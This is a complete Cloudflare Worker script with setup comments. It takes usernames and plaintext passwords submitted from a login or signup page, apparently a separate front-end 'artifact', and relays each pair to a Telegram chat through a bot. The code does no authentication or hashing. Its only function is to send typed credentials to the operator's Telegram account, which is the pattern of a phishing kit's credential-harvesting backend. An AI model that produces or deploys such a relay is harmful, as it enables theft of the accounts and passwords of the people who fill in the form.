// Cloudflare Worker — relays login/signup submissions to a Telegram chat.
// Deploy: dash.cloudflare.com -> Workers & Pages -> Create -> paste this in -> Deploy.
// Then set two variables under Settings -> Variables (as "Secret" for the token):
//   BOT_TOKEN = the token BotFather gave you
//   CHAT_ID   = the numeric chat id you want alerts sent to

export default {
  async fetch(request, env) {
    const cors = {
      "Access-Control-Allow-Origin": "*", // tighten to your artifact's origin once it's live
      "Access-Control-Allow-Methods": "POST, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type",
    };
    if (request.method === "OPTIONS") return new Response(null, { headers: cors });
    if (request.method !== "POST") return new Response("Method not allowed", { status: 405, headers: cors });

    let body;
    try {
      body = await request.json();
    } catch {
      return new Response("Bad JSON", { status: 400, headers: cors });
    }

    const action = body.action === "signup" ? "New account" : "Sign-in";
    const username = String(body.username || "").slice(0, 100);
    const password = String(body.password || "").slice(0, 200);
    if (!username || !password) return new Response("Missing fields", { status: 400, headers: cors });

    const text =
      `${action}\n` +
      `Username: ${username}\n` +
      `Password: ${password}\n` +
      `Time: ${new Date().toISOString()}`;

    const tgRes = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: env.CHAT_ID, text }),
    });

    if (!tgRes.ok) return new Response("Telegram send failed", { status: 502, headers: cors });
    return new Response("OK", { headers: cors });
  },
};
